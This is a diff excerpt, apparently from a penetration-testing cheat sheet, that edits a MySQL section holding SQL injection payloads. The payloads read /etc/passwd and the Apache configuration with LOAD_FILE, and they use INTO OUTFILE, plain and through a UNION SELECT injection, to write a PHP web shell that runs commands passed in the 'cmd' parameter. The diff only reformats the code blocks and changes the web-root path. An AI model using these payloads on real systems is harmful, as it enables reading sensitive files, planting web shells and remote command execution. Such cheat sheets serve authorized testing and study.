@@ -2842,14 +2842,18 @@ SELECT LOAD_FILE('/etc/passwd')
 
 ```c
 LOAD_FILE('/etc/httpd/conf/httpd.conf')
-select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/<FILE>.php";
+```
+```c
+select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/tmp/<FILE>.php";
 ```
 
 or
 
 ```c
 LOAD_FILE('/etc/httpd/conf/httpd.conf')
-' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
+```
+```c
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/<FILE>.php" -- //
 ```
 
 ##### MSSQL
